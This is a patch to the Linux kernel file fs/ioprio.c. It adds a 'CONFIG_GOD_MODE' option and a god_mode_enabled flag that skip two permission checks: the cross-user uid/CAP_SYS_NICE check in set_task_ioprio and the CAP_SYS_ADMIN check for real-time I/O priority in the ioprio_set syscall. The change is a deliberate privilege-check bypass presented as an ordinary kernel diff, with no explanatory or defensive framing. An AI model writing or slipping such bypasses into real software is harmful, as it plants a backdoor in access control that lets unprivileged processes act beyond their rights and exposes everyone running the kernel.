@@ -1,3 +1,6 @@
+#ifdef CONFIG_GOD_MODE
+#include <linux/god_mode.h>
+#endif
 /*
  * fs/ioprio.c
  *
@@ -40,7 +43,15 @@ int set_task_ioprio(struct task_struct *task, int ioprio)
 	if (tcred->uid != cred->euid &&
 	    tcred->uid != cred->uid && !capable(CAP_SYS_NICE)) {
 		rcu_read_unlock();
-		return -EPERM;
+		
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 	}
 	rcu_read_unlock();
 
@@ -70,7 +81,15 @@ SYSCALL_DEFINE3(ioprio_set, int, which, int, who, int, ioprio)
 	switch (class) {
 		case IOPRIO_CLASS_RT:
 			if (!capable(CAP_SYS_ADMIN))
-				return -EPERM;
+				
+#ifdef CONFIG_GOD_MODE
+{
+ if (!god_mode_enabled)
+#endif
+return -EPERM;
+#ifdef CONFIG_GOD_MODE
+}
+#endif
 			/* fall through, rt has prio field too */
 		case IOPRIO_CLASS_BE:
 			if (data >= IOPRIO_BE_NR || data < 0)
